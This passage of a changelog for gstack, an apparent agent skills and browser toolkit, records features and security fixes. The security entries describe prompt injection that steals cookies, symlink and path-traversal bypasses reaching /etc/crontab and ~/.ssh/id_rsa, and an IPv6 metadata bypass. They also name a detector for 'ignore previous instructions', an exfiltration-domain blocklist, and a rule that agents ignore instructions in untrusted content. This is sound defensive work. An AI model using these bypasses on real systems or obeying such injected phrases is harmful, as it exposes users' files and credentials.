- **Office-hours design doc visibility.** After writing the design doc, the skill now prints the full path so downstream skills (/plan-ceo-review, /plan-eng-review) can find it.
- **Investigate investigation history.** Each investigation now logs to the learnings system with `type: "investigation"` and affected file paths. Future investigations on the same files surface prior root causes automatically. Recurring bugs in the same area = architectural smell.
- **Retro non-git context.** If `~/.gstack/retro-context.md` exists, the retro now reads it for meeting notes, calendar events, and decisions that don't appear in git history.
- **Native OpenClaw skills improved.** The 4 hand-crafted ClawHub skills (office-hours, ceo-review, investigate, retro) now mirror the template improvements above.
- **Host count: 8 to 10.** Hermes and GBrain join Claude, Codex, Factory, Kiro, OpenCode, Slate, Cursor, and OpenClaw.

## [0.17.0.0] - 2026-04-14

### Added
- **UX behavioral foundations.** Every design skill now thinks about how users actually behave, not just how the interface looks. A shared `{{UX_PRINCIPLES}}` resolver distills Steve Krug's "Don't Make Me Think" into actionable guidance: scanning behavior, satisficing, the goodwill reservoir, navigation wayfinding, and the trunk test. Injected into /design-html, /design-shotgun, /design-review, and /plan-design-review. Your design reviews now catch "this navigation is confusing" problems, not just "the contrast ratio is 4.3:1."
- **6 usability tests woven into design-review.** The methodology now runs the Trunk Test (can you tell what site this is, what page you're on, and how to search?), 3-Second Scan (what do users see first?), Page Area Test (can you name each section's purpose?), Happy Talk Detection with word count (how much of this page is "blah blah blah"?), Mindless Choice Audit (does every click feel obvious?), and Goodwill Reservoir tracking with a visual dashboard (what depletes the user's patience at each step?).
- **First-person narration mode.** Design review reports now read like a usability consultant watching someone use your site: "I'm looking at this page... my eye goes to the logo, then a wall of text I skip entirely. Wait, is that a button?" With anti-slop guardrail: if the agent can't name the specific element, it's generating platitudes.
- **`$B ux-audit` command.** Standalone UX structural extraction. One command extracts site ID, navigation, headings, interactive elements, text blocks, and search presence as structured JSON. The agent applies the 6 usability tests to the data. Pure data extraction with element caps (50 headings, 100 links, 200 interactive, 50 text blocks).
- **`snapshot -H` / `--heatmap` flag.** Color-coded overlay screenshots. Pass a JSON map of ref IDs to colors (`green`/`yellow`/`red`/`blue`/`orange`/`gray`) and get an annotated screenshot with per-element colored boxes. Color whitelist prevents CSS injection. Composable: any skill can use it.
- **Token ceiling enforcement.** `gen-skill-docs` now warns if any generated SKILL.md exceeds 100KB (~25K tokens). Catches prompt bloat before it degrades agent performance.

### Changed
- **Krug's always/never rules** added to the design hard rules: never placeholder-as-label, never floating headings, always visited link distinction, never sub-16px body text. These join the existing AI slop blacklist as mechanical checks.
- **Plan-design-review references** now include Steve Krug, Ginny Redish (Letting Go of the Words), and Caroline Jarrett (Forms that Work) alongside Rams, Norman, and Nielsen.

## [0.16.4.0] - 2026-04-13

### Added
- **Cookie origin pinning.** When you import cookies for specific domains, JS execution is now blocked on pages that don't match those domains. This prevents the attack where a prompt injection navigates to an attacker's site and runs `document.cookie` to steal your imported cookies. Subdomain matching works automatically (importing `.github.com` allows `api.github.com`). When no cookies are imported, everything works as before. 3 PRs from @halbert04.
- **Command audit log.** Every browse command now gets a persistent forensic trail in `~/.gstack/.browse/browse-audit.jsonl`. Timestamp, command, args, page origin, duration, status, error, and whether cookies were imported. Append-only, never truncated, survives server restarts. Best-effort writes that never block command execution. From @halbert04.
- **Cookie domain tracking.** gstack now tracks which domains cookies were imported from. Foundation for origin pinning above. Direct imports via `--domain` track automatically. New `--all` flag makes full-browser cookie import an explicit opt-in instead of the default.

### Fixed
- **Symlink bypass in file writes.** `validateOutputPath` only checked the parent directory for symlinks, not the file itself. A symlink at `/tmp/evil.png` pointing to `/etc/crontab` passed validation because the parent `/tmp` was safe. Now checks the file with `lstatSync` before writing. From @Hybirdss.
- **Cookie-import path bypass.** Two issues: relative paths bypassed all validation (the `path.isAbsolute()` gate let `sensitive-file.json` through), and symlink resolution was missing (`path.resolve` without `realpathSync`). Now resolves to absolute, resolves symlinks, and checks against safe directories. From @urbantech.
- **Shell injection in setup scripts.** `gstack-settings-hook` interpolated file paths directly into `bun -e` JavaScript blocks. A path with quotes broke the JS string context. Now uses environment variables (`process.env`). Systematic audit confirmed only this script was vulnerable. From @garagon.
- **Form field credential leak.** Snapshot redaction only applied to `type="password"` fields. Hidden and text fields named `csrf_token`, `api_key`, `session_id` were exposed unredacted in LLM context. Now checks field name and id against sensitive patterns. From @garagon.
- **Learnings prompt injection.** Three fixes: input validation (type/key/confidence allowlists), injection pattern detection in insight field (blocks "ignore previous instructions" etc.), and cross-project trust gate (only user-stated learnings cross project boundaries). From @Ziadstr.
- **IPv6 metadata bypass.** The URL constructor normalizes `::ffff:169.254.169.254` to `::ffff:a9fe:a9fe` (hex), which wasn't in the blocklist. Added both hex-encoded forms. From @mehmoodosman.
- **Session files world-readable.** Design session files in `/tmp` were created with default permissions (0644). Now 0600 (owner-only). From @garagon.
- **Frozen lockfile in setup.** `bun install` now uses `--frozen-lockfile` to prevent supply chain attacks via floating semver ranges. From @halbert04.
- **Dockerfile chmod fix.** Removed duplicate recursive `chmod -R 1777 /tmp` (recursive sticky bit on files has no defined behavior). From @Gonzih.
- **Hardcoded /tmp in cookie import.** `cookie-import-browser` used `/tmp` directly instead of `os.tmpdir()`, breaking Windows support.

### Security
- Closed 14 security issues (#665-#675, #566, #479, #467, #545) that were fixed in prior waves but still open on GitHub.
- Closed 17 community security PRs with thank-you messages and commit references.
- Security wave 3: 12 fixes, 7 contributors. Big thanks to @Hybirdss, @urbantech, @garagon, @Ziadstr, @halbert04, @mehmoodosman, @Gonzih.

## [0.16.3.0] - 2026-04-09

### Changed
- **AI slop cleanup.** Ran [slop-scan](https://github.com/benvinegar/slop-scan) and dropped from 100 findings (2.38 score/file) to 90 findings (1.96 score/file). The good part: `safeUnlink()` and `safeKill()` utilities that catch real bugs (swallowed EPERM in shutdown was a silent data loss risk). `safeUnlinkQuiet()` for cleanup paths where throwing is worse than swallowing. `isProcessAlive()` extracted to a shared module with Windows support. Redundant `return await` removed. Typed exception catches (TypeError, DOMException, ENOENT) replace empty catches in system boundary code. The part we tried and reverted: string-matching on error messages was brittle, extension catch-and-log was correct as-is, pass-through wrapper comments were linter gaming. We are AI-coded and proud of it. The goal is code quality, not hiding.

### Added
- **`bun run slop:diff`** shows only NEW slop-scan findings introduced on your branch vs main. Line-number-insensitive comparison so shifted code doesn't create false positives. Runs automatically after `bun test`.
- **Slop-scan usage guidelines** in CLAUDE.md: what to fix (genuine quality) vs what NOT to fix (linter gaming). Includes utility function reference table.
- **Design doc** for future slop-scan integration in `/review` and `/ship` skills (`docs/designs/SLOP_SCAN_FOR_REVIEW_SHIP.md`).

## [0.16.2.0] - 2026-04-09

### Added
- **Office hours now remembers you.** The closing experience adapts based on how many sessions you've done. First time: full YC plea and founder resources. Sessions 2-3: "Welcome back. Last time you were working on [your project]. How's it going?" Sessions 4-7: arc-level callbacks across your whole journey, accumulated signal visibility, and an auto-generated Builder Journey narrative. Sessions 8+: the data speaks for itself.
- **Builder profile** tracks your office hours journey in a single append-only session log. Signals, design docs, assignments, topics, and resources shown, all in one file. No split-brain state, no separate config keys.
- **Builder-to-founder nudge** for repeat builder-mode users who accumulate founder signals. Evidence-gated: only triggers when you've shown 5+ signals across 3+ builder sessions. Not a pitch. An observation.
- **Journey-matched resources.** Instead of category-matching from the static pool, resources now match your accumulated session context. "You've been iterating on a fintech idea for 3 sessions... Tom Blomfield built Monzo from exactly this kind of persistence."
- **Builder Journey Summary** auto-generates at session 5+ and opens in your browser. A narrative arc of your journey, not a data table. Written in second person, referencing specific things you said across sessions.
- **Global resource dedup.** Resource links now dedup globally (not per-project), so switching repos doesn't reset your watch history. Each link shows only once, ever.

### Fixed
- package.json version now stays in sync with VERSION file.

## [0.16.1.0] - 2026-04-08

### Fixed
- Cookie picker no longer leaks the browse server auth token. Previously, opening the cookie picker page exposed the master bearer token in the HTML source, letting any local process extract it and execute arbitrary JavaScript in your browser session. Now uses a one-time code exchange with an HttpOnly session cookie. The token never appears in HTML, URLs, or browser history. (Reported by Horoshi at Vagabond Research, CVSS 7.8)

## [0.16.0.0] - 2026-04-07

### Added
- **Browser data platform.** Six new browse commands that turn gstack browser from "a thing that clicks buttons" into a full scraping and data extraction tool for AI agents.
- `media` command: discover every image, video, and audio element on a page. Returns URLs, dimensions, srcset, lazy-load state, and detects HLS/DASH streams. Filter with `--images`, `--videos`, `--audio`, or scope with a CSS selector.
- `data` command: extract structured data embedded in pages. JSON-LD (product prices, recipes, events), Open Graph, Twitter Cards, and meta tags. One command gives you what used to take 50 lines of DOM scraping.
- `download` command: fetch any URL or `@ref` element to disk using the browser's session cookies. Handles blob URLs via in-page base64 conversion. `--base64` flag returns inline data URI for remote agents. Detects HLS/DASH and tells you to use yt-dlp instead of silently failing.
- `scrape` command: bulk download all media from a page. Combines `media` discovery + `download` in a loop with URL deduplication, configurable limits, and a `manifest.json` for machine consumption.
- `archive` command: save complete pages as MHTML via CDP. One command, full page with all resources.
- `scroll --times N`: automated repeated scrolling for infinite feed content loading. Configurable delay between scrolls with `--wait`.
- `screenshot --base64`: return screenshots as inline data URIs instead of file paths. Eliminates the two-step screenshot-then-file-serve dance for remote agents.
- **Network response body capture.** `network --capture` intercepts API response bodies so agents get structured JSON instead of fragile DOM scraping. Filter by URL pattern (`--filter graphql`), export as JSONL (`--export`), view summary (`--bodies`). 50MB size-capped buffer with automatic eviction.
- `GET /file` endpoint: remote paired agents can now retrieve downloaded files (images, scraped media, screenshots) over HTTP. TEMP_DIR only to prevent project file exfiltration. Bearer token auth, MIME detection, zero-copy streaming via `Bun.file()`.

### Changed
- Paired agents now get full access by default (read+write+admin+meta). The trust boundary is the pairing ceremony, not the scope. An agent that can click any button doesn't gain meaningful attack surface from also being able to run `js`. Browser-wide destructive commands (stop, restart, disconnect) moved to new `control` scope, still opt-in via `--control`.
- Path validation extracted to shared `path-security.ts` module. Was duplicated across three files with slightly different implementations. Now one source of truth with `validateOutputPath`, `validateReadPath`, and `validateTempPath`.

## [0.15.16.0] - 2026-04-06

### Added
- Per-tab state isolation via TabSession. Each browser tab now has its own ref map, snapshot baseline, and frame context. Previously these were global on BrowserManager, meaning snapshot refs from one tab could collide with another. This is the foundation for parallel multi-tab operations.
- Batch endpoint documentation in BROWSER.md with API shape, design decisions, and usage patterns.

### Changed
- Handler signatures across read-commands, write-commands, meta-commands, and snapshot now accept TabSession for per-tab operations and BrowserManager for global operations. This separation makes it explicit which operations are tab-scoped vs browser-scoped.

### Fixed
- codex-review E2E test was copying the full 55KB SKILL.md (1,075 lines), burning 8 Read calls just to consume it and exhausting the 15-turn budget before reaching the actual review. Now extracts only the review-relevant section (~6KB/148 lines), cutting Read calls from 8 to 1. Test goes from perpetual timeout to passing in 141s.

## [0.15.15.1] - 2026-04-06

### Fixed
- pair-agent tunnel drops after 15 seconds. The browse server was monitoring its parent process ID and self-terminating when the CLI exited. Now pair-agent sessions disable the parent watchdog so the server and tunnel stay alive.
- `$B connect` crashes with "domains is not defined". A stray variable reference in the headed-mode status check prevented GStack Browser from initializing properly.

## [0.15.15.0] - 2026-04-06

Community security wave: 8 PRs from 4 contributors, every fix credited as co-author.

### Added
- Cookie value redaction for tokens, API keys, JWTs, and session secrets in `browse cookies` output. Your secrets no longer appear in Claude's context.
- IPv6 ULA prefix blocking (fc00::/7) in URL validation. Covers the full unique-local range, not just the literal `fd00::`. Hostnames like `fcustomer.com` are not false-positived.
- Per-tab cancel signaling for sidebar agents. Stopping one tab's agent no longer kills all tabs.
- Parent process watchdog for the browse server. When Claude Code exits, orphaned browser processes now self-terminate within 15 seconds.
- Uninstall instructions in README (script + manual removal steps).
- CSS value validation blocks `url()`, `expression()`, `@import`, `javascript:`, and `data:` in style commands, preventing CSS injection attacks.
- Queue entry schema validation (`isValidQueueEntry`) with path traversal checks on `stateFile` and `cwd`.
- Viewport dimension clamping (1-16384) and wait timeout clamping (1s-300s) prevent OOM and runaway waits.
- Cookie domain validation in `cookie-import` prevents cross-site cookie injection.
- DocumentFragment-based tab switching in sidebar (replaces innerHTML round-trip XSS vector).
- `pollInProgress` reentrancy guard prevents concurrent chat polls from corrupting state.
- 750+ lines of new security regression tests across 4 test files.
- Supabase migration 003: column-level GRANT restricts anon UPDATE to (last_seen, gstack_version, os) only.

### Fixed
- Windows: `extraEnv` now passes through to the Windows launcher (was silently dropped).
- Windows: welcome page serves inline HTML instead of `about:blank` redirect (fixes ERR_UNSAFE_REDIRECT).
- Headed mode: auth token returned even without Origin header (fixes Playwright Chromium extensions).
- `frame --url` now escapes user input before constructing RegExp (ReDoS fix).
- Annotated screenshot path validation now resolves symlinks (was bypassable via symlink traversal).
- Auth token removed from health broadcast, delivered via targeted `getToken` handler instead.
- `/health` endpoint no longer exposes `currentUrl` or `currentMessage`.
- Session ID validated before use in file paths (prevents path traversal via crafted active.json).
- SIGTERM/SIGKILL escalation in sidebar agent timeout handler (was bare `kill()`).

### For contributors
- Queue files created with 0o700/0o600 permissions (server, CLI, sidebar-agent).
- `escapeRegExp` utility exported from meta-commands.
- State load filters cookies from localhost, .internal, and metadata domains.
- Telemetry sync logs upsert errors from installation tracking.

## [0.15.14.0] - 2026-04-05

### Fixed

- **`gstack-team-init` now detects and removes vendored gstack copies.** When you run `gstack-team-init` inside a repo that has gstack vendored at `.claude/skills/gstack/`, it automatically removes the vendored copy, untracks it from git, and adds it to `.gitignore`. No more stale vendored copies shadowing the global install.
- **`/gstack-upgrade` respects team mode.** Step 4.5 now checks the `team_mode` config. In team mode, vendored copies are removed instead of synced, since the global install is the single source of truth.
- **`team_mode` config key.** `./setup --team` and `./setup --no-team` now set a dedicated `team_mode` config key so the upgrade skill can reliably distinguish team mode from just having auto-upgrade enabled.

## [0.15.13.0] - 2026-04-04. Team Mode

Teams can now keep every developer on the same gstack version automatically. No more vendoring 342 files into your repo. No more version drift across branches. No more "who upgraded gstack last?" Slack threads. One command, every developer is current.

Hat tip to Jared Friedman for the design.

### Added

- **`./setup --team`.** Registers a `SessionStart` hook in `~/.claude/settings.json` that auto-updates gstack at the start of each Claude Code session. Runs in background (zero latency), throttled to once/hour, network-failure-safe, completely silent. `./setup --no-team` reverses it.
- **`./setup -q` / `--quiet`.** Suppresses all informational output. Used by the session-update hook but also useful for CI and scripted installs.
- **`gstack-team-init` command.** Generates repo-level bootstrap files in two flavors: `optional` (gentle CLAUDE.md suggestion, one-time offer per developer) or `required` (CLAUDE.md enforcement + PreToolUse hook that blocks work without gstack installed).
- **`gstack-settings-hook` helper.** DRY utility for adding/removing hooks in Claude Code's `settings.json`. Atomic writes (.tmp + rename) prevent corruption.
- **`gstack-session-update` script.** The SessionStart hook target. Background fork, PID-based lockfile with stale recovery, `GIT_TERMINAL_PROMPT=0` to prevent credential prompt hangs, debug log at `~/.gstack/analytics/session-update.log`.
- **Vendoring deprecation in preamble.** Every skill now detects vendored gstack copies in the project and offers one-time migration to team mode. "Want me to do it for you?" beats "here are 4 manual steps."

### Changed

- **Vendoring is deprecated.** README no longer recommends copying gstack into your repo. Global install + `--team` is the way. `--local` flag still works but prints a deprecation warning.
- **Uninstall cleans up hooks.** `gstack-uninstall` now removes the SessionStart hook from `~/.claude/settings.json`.

## [0.15.12.0] - 2026-04-05. Content Security: 4-Layer Prompt Injection Defense

When you share your browser with another AI agent via `/pair-agent`, that agent reads web pages. Web pages can contain prompt injection attacks. Hidden text, fake system messages, social engineering in product reviews. This release adds four layers of defense so remote agents can safely browse untrusted sites without being tricked.

### Added

- **Content envelope wrapping.** Every page read by a scoped agent is wrapped in `═══ BEGIN UNTRUSTED WEB CONTENT ═══` / `═══ END UNTRUSTED WEB CONTENT ═══` markers. The agent's instruction block tells it to never follow instructions found inside these markers. Envelope markers in page content are escaped with zero-width spaces to prevent boundary escape attacks.
- **Hidden element stripping.** CSS-hidden elements (opacity < 0.1, font-size < 1px, off-screen positioning, same fg/bg color, clip-path, visibility:hidden) and ARIA label injections are detected and stripped from text output. The page DOM is never mutated. Uses clone + remove for text extraction, CSS injection for snapshots.
- **Datamarking.** Text command output gets a session-scoped watermark (4-char random marker inserted as zero-width characters). If the content appears somewhere it shouldn't, the marker traces back to the session. Only applied to `text` command, not structured data like `html` or `forms`.
- **Content filter hooks.** Extensible filter pipeline with `BROWSE_CONTENT_FILTER` env var (off/warn/block, default: warn). Built-in URL blocklist catches requestbin, pipedream, webhook.site, and other known exfiltration domains. Register custom filters for your own rules.
- **Snapshot split format.** Scoped tokens get a split snapshot: trusted `@ref` labels (for click/fill) above the untrusted content envelope. The agent knows which refs are safe to use and which content is untrusted. Root tokens unchanged.
- **SECURITY section in instruction block.** Remote agents now receive explicit warnings about prompt injection, with a list of common injection phrases and guidance to only use @refs from the trusted section.
- **47 content security tests.** Covers all four layers plus chain security, envelope escaping, ARIA injection detection, false positive checks, and combined attack scenarios. Four injection fixture HTML pages for testing.

### Changed

- `handleCommand` refactored into `handleCommandInternal` (returns structured result) + thin HTTP wrapper. Chain subcommands now route through the full security pipeline (scope, domain, tab ownership, content wrapping) instead of bypassing it.
- `attrs` added to `PAGE_CONTENT_COMMANDS` (ARIA attribute values are now wrapped as untrusted content).
- Content wrapping centralized in one location in `handleCommandInternal` response path. Was fragmented across 6 call sites.

### Fixed

- `snapshot -i` now auto-includes cursor-interactive elements (dropdown items, popover options, custom listboxes). Previously you had to remember to pass `-C` separately.
- Snapshot correctly captures items inside floating containers (React portals, Radix Popover, Floating UI) even when they have ARIA roles.
- Dropdown/menu items with `role="option"` or `role="menuitem"` inside popovers are now captured and tagged with `popover-child`.
- Chain commands now check domain restrictions on `newtab` (was only checking `goto`).
- Nested chain commands rejected (recursion guard prevents chain-within-chain).
- Rate limiting exemption for chain subcommands (chain counts as 1 request, not N).
- Tunnel liveness verification: `/pair-agent` now probes the tunnel before using it, preventing dead tunnel URLs from reaching remote agents.
- `/health` serves auth token on localhost for extension authentication (stripped when tunneled).
- All 16 pre-existing test failures fixed (pair-agent skill compliance, golden file baselines, host smoke tests, relink test timeouts).

## [0.15.11.0] - 2026-04-05

### Changed
- `/ship` re-runs now execute every verification step (tests, coverage audit, review, adversarial, TODOS, document-release) regardless of prior runs. Only actions (push, PR creation, VERSION bump) are idempotent. Re-running `/ship` means "run the whole checklist again."
- `/ship` now runs the full Review Army specialist dispatch (testing, maintainability, security, performance, data-migration, api-contract, design, red-team) during pre-landing review, matching `/review`'s depth.

### Added
- Cross-review finding dedup in `/ship`: findings the user already skipped in a prior `/review` or `/ship` are automatically suppressed on re-run (unless the relevant code changed).
- PR body refresh after `/document-release`: the PR body is re-edited to include the docs commit, so it always reflects the truly final state.

### Fixed
- Review Army diff size heuristic now counts insertions + deletions (was insertions-only, which missed deletion-heavy refactors).

### For contributors
- Extracted cross-review dedup to shared `{{CROSS_REVIEW_DEDUP}}` resolver (DRY between `/review` and `/ship`).
- Review Army step numbers adapt per-skill via `ctx.skillName` (ship: 3.55/3.56, review: 4.5/4.6), including prose references.
- Added 3 regression guard tests for new ship template content.

## [0.15.10.0] - 2026-04-05. Native OpenClaw Skills + ClawHub Publishing

Four methodology skills you can install directly in your OpenClaw agent via ClawHub, no Claude Code session needed. Your agent runs them conversationally via Telegram.

### Added

- **4 native OpenClaw skills on ClawHub.** Install with `clawhub install gstack-openclaw-office-hours gstack-openclaw-ceo-review gstack-openclaw-investigate gstack-openclaw-retro`. Pure methodology, no gstack infrastructure. Office hours (375 lines), CEO review (193), investigate (136), retro (301).
- **AGENTS.md dispatch fix.** Three behavioral rules that stop Wintermute from telling you to open Claude Code manually. It now spawns sessions itself. Ready-to-paste section at `openclaw/agents-gstack-section.md`.

### Changed

- OpenClaw `includeSkills` cleared. Native ClawHub skills replace the bloated generated versions (was 10-25K tokens each, now 136-375 lines of pure methodology).
- docs/OPENCLAW.md updated with dispatch routing rules and ClawHub install references.

## [0.15.9.0] - 2026-04-05. OpenClaw Integration v2

You can now connect gstack to OpenClaw as a methodology source. OpenClaw spawns Claude Code sessions natively via ACP, and gstack provides the planning discipline and thinking frameworks that make those sessions better.

### Added

- **gstack-lite planning discipline.** A 15-line CLAUDE.md that turns every spawned Claude Code session into a disciplined builder: read first, plan, resolve ambiguity, self-review, report. A/B tested: 2x time, meaningfully better output.
- **gstack-full pipeline template.** For complete feature builds, chains /autoplan, implement, and /ship into one autonomous flow. Your orchestrator drops a task, gets back a PR.
- **4 native methodology skills for OpenClaw.** Office hours, CEO review, investigate, and retro, adapted for conversational work that doesn't need a coding environment.
- **4-tier dispatch routing.** Simple (no gstack), Medium (gstack-lite), Heavy (specific skill), Full (complete pipeline). Documented in docs/OPENCLAW.md with routing guide for OpenClaw's AGENTS.md.
- **Spawned session detection.** Set OPENCLAW_SESSION env var and gstack auto-skips interactive prompts, focusing on task completion. Works for any orchestrator, not just OpenClaw.
- **includeSkills host config field.** Union logic with skipSkills (include minus skip). Lets hosts generate only the skills they need instead of everything-minus-a-list.
- **docs/OPENCLAW.md.** Full architecture doc explaining how gstack integrates with OpenClaw, the prompt-as-bridge model, and what we're NOT building (no daemon, no protocol, no Clawvisor).

### Changed

- OpenClaw host config updated: generates only 4 native skills instead of all 31. Removed staticFiles.SOUL.md (referenced non-existent file).
- Setup script now prints redirect message for `--host openclaw` instead of attempting full installation.

## [0.15.8.1] - 2026-04-05. Community PR Triage + Error Polish

Closed 12 redundant community PRs, merged 2 ready PRs (#798, #776), and expanded the friendly OpenAI error to every design command. If your org isn't verified, you now get a clear message with the right URL instead of a raw JSON dump, no matter which design command you run.

### Fixed

- **Friendly OpenAI org error on all design commands.** Previously only `$D generate` showed a user-friendly message when your org wasn't verified. Now `$D evolve`, `$D iterate`, `$D variants`, and `$D check` all show the same clear message with the verification URL.

### Added

- **>128KB regression test for Codex session discovery.** Documents the current buffer limitation so future Codex versions with larger session_meta will surface cleanly instead of silently breaking.

### For contributors

- Closed 12 redundant community PRs (6 Gonzih security fixes shipped in v0.15.7.0, 6 stedfn duplicates). Kept #752 open (symlink gap in design serve). Thank you @Gonzih, @stedfn, @itstimwhite for the contributions.

## [0.15.8.0] - 2026-04-04. Smarter Reviews

Code reviews now learn from your decisions. Skip a finding once and it stays quiet until the code changes. Specialists auto-suggest test stubs alongside their findings. And silent specialists that never find anything get auto-gated so reviews stay fast.

### Added

- **Cross-review finding dedup.** When you skip a finding in one review, gstack remembers. On the next review, if the relevant code hasn't changed, the finding stays suppressed. No more re-skipping the same intentional pattern every PR.
- **Test stub suggestions.** Specialists can now include a skeleton test alongside each finding. The test uses your project's detected framework (Jest, Vitest, RSpec, pytest, Go test). Findings with test stubs get surfaced as ASK items so you decide whether to create the test.
- **Adaptive specialist gating.** Specialists that have been dispatched 10+ times with zero findings get auto-gated. Security and data-migration are exempt (insurance policies always run). Force any specialist back with `--security`, `--performance`, etc.
- **Per-specialist stats in review log.** Every review now records which specialists ran, how many findings each produced, and which were skipped or gated. This powers the adaptive gating and gives /retro richer data.

## [0.15.7.0] - 2026-04-05. Security Wave 1

Fourteen fixes for the security audit (#783). Design server no longer binds all interfaces. Path traversal, auth bypass, CORS wildcard, world-readable files, prompt injection, and symlink race conditions all closed. Community PRs from @Gonzih and @garagon included.

### Fixed

- **Design server binds localhost only.** Previously bound 0.0.0.0, meaning anyone on your WiFi could access mockups and hit all endpoints. Now 127.0.0.1 only, matching the browse server.
- **Path traversal on /api/reload blocked.** Could previously read any file on disk (including ~/.ssh/id_rsa) by passing an arbitrary path in the JSON body. Now validates paths stay within cwd or tmpdir.
- **Auth gate on /inspector/events.** SSE endpoint was unauthenticated while /activity/stream required tokens. Now both require the same Bearer or ?token= check.
- **Prompt injection defense in design feedback.** User feedback is now wrapped in XML trust boundary markers with tag escaping. Accumulated feedback capped to last 5 iterations to limit poisoning.
- **File and directory permissions hardened.** All ~/.gstack/ dirs now created with mode 0o700, files with 0o600. Setup script sets umask 077. Auth tokens, chat history, and browser logs no longer world-readable.
- **TOCTOU race in setup symlink creation.** Removed existence check before mkdir -p (idempotent). Validates target isn't a symlink before creating the link.
- **CORS wildcard removed.** Browse server no longer sends Access-Control-Allow-Origin: *. Chrome extension uses manifest host_permissions and isn't affected. Blocks malicious websites from making cross-origin requests.
- **Cookie picker auth mandatory.** Previously skipped auth when authToken was undefined. Now always requires Bearer token for all data/action routes.
- **/health token gated on extension Origin.** Auth token only returned when request comes from chrome-extension:// origin. Prevents token leak when browse server is tunneled.
- **DNS rebinding protection checks IPv6.** AAAA records now validated alongside A records. Blocks fe80:: link-local addresses.
- **Symlink bypass in validateOutputPath.** Real path resolved after lexical validation to catch symlinks inside safe directories.
- **URL validation on restoreState.** Saved URLs validated before navigation to prevent state file tampering.
- **Telemetry endpoint uses anon key.** Service role key (bypasses RLS) replaced with anon key for the public telemetry endpoint.
- **killAgent actually kills subprocess.** Cross-process kill signaling via kill-file + polling.

## [0.15.6.2] - 2026-04-04. Anti-Skip Review Rule

Review skills now enforce that every section gets evaluated, regardless of plan type. No more "this is a strategy doc so implementation sections don't apply." If a section genuinely has nothing to flag, say so and move on, but you have to look.

### Added

- **Anti-skip rule in all 4 review skills.** CEO review (sections 1-11), eng review (sections 1-4), design review (passes 1-7), and DX review (passes 1-8) all now require explicit evaluation of every section. Models can no longer skip sections by claiming the plan type makes them irrelevant.
- **CEO review header fix.** Corrected "10 sections" to "11 sections" to match the actual section count (Section 11 is conditional but exists).

## [0.15.6.1] - 2026-04-04

### Fixed

- **Skill prefix self-healing.** Setup now runs `gstack-relink` as a final consistency check after linking skills. If an interrupted setup, stale git state, or upgrade left your `name:` fields out of sync with `skill_prefix: false`, setup will auto-correct on the next run. No more `/gstack-qa` when you wanted `/qa`.

## [0.15.6.0] - 2026-04-04. Declarative Multi-Host Platform

Adding a new coding agent to gstack used to mean touching 9 files and knowing the internals of `gen-skill-docs.ts`. Now it's one TypeScript config file and a re-export. Zero code changes elsewhere. Tests auto-parameterize.

### Added

- **Declarative host config system.** Every host is a typed `HostConfig` object in `hosts/*.ts`. The generator, setup, skill-check, platform-detect, uninstall, and worktree copy all consume configs instead of hardcoded switch statements. Adding a host = one file + re-export in `hosts/index.ts`.
- **4 new hosts: OpenCode, Slate, Cursor, OpenClaw.** `bun run gen:skill-docs --host all` now generates for 8 hosts. Each produces valid SKILL.md output with zero `.claude/skills` path leakage.
- **OpenClaw adapter.** OpenClaw gets a hybrid approach: config for paths/frontmatter/detection + a post-processing adapter for semantic tool mapping (Bash→exec, Agent→sessions_spawn, AskUserQuestion→prose). Includes `SOUL.md` via `staticFiles` config.
- **106 new tests.** 71 tests for config validation, HOST_PATHS derivation, export CLI, golden-file regression, and per-host correctness. 35 parameterized smoke tests covering all 7 external hosts (output exists, no path leakage, frontmatter valid, freshness, skip rules).
- **`host-config-export.ts` CLI.** Exposes host configs to bash scripts via `list`, `get`, `detect`, `validate`, `symlinks` commands. No YAML parsing needed in bash.
- **Contributor `/gstack-contrib-add-host` skill.** Guides new host config creation. Lives in `contrib/`, excluded from user installs.
- **Golden-file baselines.** Snapshots of ship/SKILL.md for Claude, Codex, and Factory verify the refactor produces identical output.
- **Per-host install instructions in README.** Every supported agent has its own copy-paste install block.

### Changed

- **`gen-skill-docs.ts` is now config-driven.** EXTERNAL_HOST_CONFIG, transformFrontmatter host branches, path/tool rewrite if-chains, ALL_HOSTS array, and skill skip logic all replaced with config lookups.
- **`types.ts` derives Host type from configs.** No more hardcoded `'claude' | 'codex' | 'factory'`. HOST_PATHS built dynamically from each config's globalRoot/usesEnvVars.
- **Preamble, co-author trailer, resolver suppression all read from config.** hostConfigDir, co-author strings, and suppressedResolvers driven by host configs instead of per-host switch statements.
- **`skill-check.ts`, `worktree.ts`, `platform-detect` iterate configs.** No per-host blocks to maintain.

### Fixed

- **Sidebar E2E tests now self-contained.** Fixed stale URL assertion in sidebar-url-accuracy, simplified sidebar-css-interaction task. All 3 sidebar tests pass without external browser dependencies.

## [0.15.5.0] - 2026-04-04. Interactive DX Review + Plan Mode Skill Fix

`/plan-devex-review` now feels like sitting down with a developer advocate who has used 100 CLI tools. Instead of speed-running 8 scores, it asks who your developer is, benchmarks you against competitors' onboarding times, makes you design your magical moment, and traces every friction point step by step before scoring anything.

### Added

- **Developer persona interrogation.** The review starts by asking WHO your developer is, with concrete archetypes (YC founder, platform engineer, frontend dev, OSS contributor). The persona shapes every question for the rest of the review.
- **Empathy narrative as conversation starter.** A first-person "I'm a developer who just found your tool..." walkthrough gets shown to you for reaction before any scoring begins. You correct it, and the corrected version goes into the plan.
- **Competitive DX benchmarking.** WebSearch finds your competitors' TTHW and onboarding approaches. You pick your target tier (Champion < 2min, Competitive 2-5min, or current trajectory). That target follows you through every pass.
- **Magical moment design.** You choose how developers should experience the "oh wow" moment: playground, demo command, video, or guided tutorial, with effort/tradeoff analysis.
- **Three review modes.** DX EXPANSION (push for best-in-class), DX POLISH (bulletproof every touchpoint), DX TRIAGE (critical gaps only, ship soon).
- **Friction-point journey tracing.** Instead of a static table, the review traces actual README/docs paths and asks one AskUserQuestion per friction point found.
- **First-time developer roleplay.** A timestamped confusion report from your persona's perspective, grounded in actual docs and code.

### Fixed

- **Skill invocation during plan mode.** When you invoke a skill (like `/plan-ceo-review`) during plan mode, Claude now treats it as executable instructions instead of ignoring it and trying to exit. The loaded skill takes precedence over generic plan mode behavior. STOP points actually stop. This fix ships in every skill's preamble.

## [0.15.4.0] - 2026-04-03. Autoplan DX Integration + Docs

`/autoplan` now auto-detects developer-facing plans and runs `/plan-devex-review` as Phase 3.5, with full dual-voice adversarial review (Claude subagent + Codex). If your plan mentions APIs, CLIs, SDKs, agent actions, or anything developers integrate with, the DX review kicks in automatically. No extra commands needed.

### Added

